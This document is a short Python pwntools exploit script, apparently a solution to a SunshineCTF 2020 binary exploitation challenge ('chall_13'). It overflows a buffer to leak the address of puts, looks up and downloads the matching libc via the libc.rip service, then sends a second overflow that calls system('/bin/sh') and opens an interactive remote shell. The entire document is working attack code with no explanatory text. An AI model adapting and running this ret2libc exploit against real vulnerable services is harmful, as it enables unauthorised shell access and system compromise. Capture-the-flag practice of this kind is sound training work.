from pwn import *
binary = context.binary = ELF('./chall_13')

libc_index = 1
p = remote('chal.2020.sunshinectf.org',30013)

payload = 0x3e*b'A'
payload +=p32(binary.sym.puts)
payload += p32(binary.sym.vuln)
payload += p32(binary.got.puts)

p.sendlineafter('Keep on writing\n','IxZ')
p.sendline(payload)

rec = p.recv(4)
puts = u32(rec)


if not 'libc' in locals():
    import requests
    r = requests.post('https://libc.rip/api/find',json = {'symbols':{'puts':hex(puts)[-3:]}})
    libc_url = r.json()[libc_index]['download_url']
    libc_file = libc_url.split('/')[-1:][0]
    if not os.path.exists(libc_file):
        log.info('getting: ' + libc_url)
        r = requests.get(libc_url,allow_redirects=True)
        open(libc_file,'wb').write(r.content)

    libc = ELF(libc_file)
print('pre libc.address: ',libc.address)
print('sym.puts: ',libc.sym.puts)
print('binary.got.puts: ',binary.got.puts)
libc.address = puts- libc.sym.puts
print('puts: ', puts)
log.info('libc.address: '+hex(libc.address))

payload = 0x3e*b'A'
payload += p32(libc.sym.system)
payload += 4*b'B'
payload += p32(libc.search(b'/bin/sh').__next__())
p.sendline(payload)
p.interactive()
